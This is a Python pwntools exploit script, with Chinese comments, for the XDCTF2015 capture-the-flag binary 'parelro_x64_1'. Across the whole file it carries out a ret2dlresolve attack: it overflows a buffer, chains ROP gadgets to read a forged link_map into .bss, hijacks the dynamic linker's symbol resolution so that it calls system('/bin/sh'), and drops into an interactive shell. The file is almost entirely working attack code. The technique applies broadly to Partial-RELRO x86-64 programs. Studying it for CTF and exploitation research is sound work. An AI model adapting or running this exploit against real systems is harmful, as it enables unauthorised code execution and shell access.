from pwn import * 

context(os='linux',arch='amd64',log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
 
r = process('./parelro_x64_1') 
elf = ELF('./parelro_x64_1') 
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
read_plt = elf.plt['read'] 
write_got = elf.got['write'] 
vuln_addr = elf.sym['vuln'] 
#gdb.attach(r, "b *0x40068F") 

bss = 0x601050 
bss_stage = bss + 0x200
l_addr =  libc.sym['system'] -libc.sym['write']  # 这里为负数
 
pop_rdi = 0x4007b3 
pop_rsi = 0x4007b1 
plt_load = 0x400516 
 
def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
    #l_addr
    linkmap = p64(offset & (2 ** 64 - 1))
    # 可以为任意值
    linkmap += p64(0) 
    # 这里的值就是伪造的.rel.plt的地址
    linkmap += p64(fake_linkmap_addr + 0x18)
 
    # Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址。
    # 但是这里不需要使用返回的地址，因此只需要设置一个可读写的地址即可
    linkmap += p64((fake_linkmap_addr + 0x30 - offset) & (2 ** 64 - 1))
    # Rela->r_info,用于索引symtab上的对应项，7>>32=0，也就是指向symtab的第一项
    linkmap += p64(0x7) 
    # Rela->r_addend,任意值都行
    linkmap += p64(0)
 
    #link_map结构体中的字段l_ns，随便赋值即可
    linkmap += p64(0)
 
    # 这里就是伪造的symtab的地址,为已解析函数的got表地址-0x8
    linkmap += p64(0)
    linkmap += p64(known_func_ptr - 0x8) 
 
    linkmap += b'/bin/sh\x00'
    linkmap = linkmap.ljust(0x68,b'A')
    # fake_linkmap_addr + 0x68, 对应的值的是DT_STRTAB的地址，由于我们用不到strtab，所以随意设置了一个可读区域
    linkmap += p64(fake_linkmap_addr) 
    # fake_linkmap_addr + 0x70 , 对应的值是DT_SYMTAB的地址
    linkmap += p64(fake_linkmap_addr + 0x38) 
    linkmap = linkmap.ljust(0xf8,b'A')
    # fake_linkmap_addr + 0xf8, 对应的值是DT_JMPREL的地址
    linkmap += p64(fake_linkmap_addr + 0x8) 
    return linkmap

# 伪造link_map
fake_link_map = fake_Linkmap_payload(bss_stage, write_got ,l_addr)
 
payload = flat( 'a' * 120 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , read_plt , 
                # 把link_map写到bss段上
                pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 
                # 把/bin/sh传进rdi，并且调用_dl_rutnime_resolve函数，传入伪造好的link_map和索引
)
 
r.recvuntil("Welcome to XDCTF2015~!\n") 
r.sendline(payload) 

pause() 
r.send(fake_link_map)
 
r.interactive()
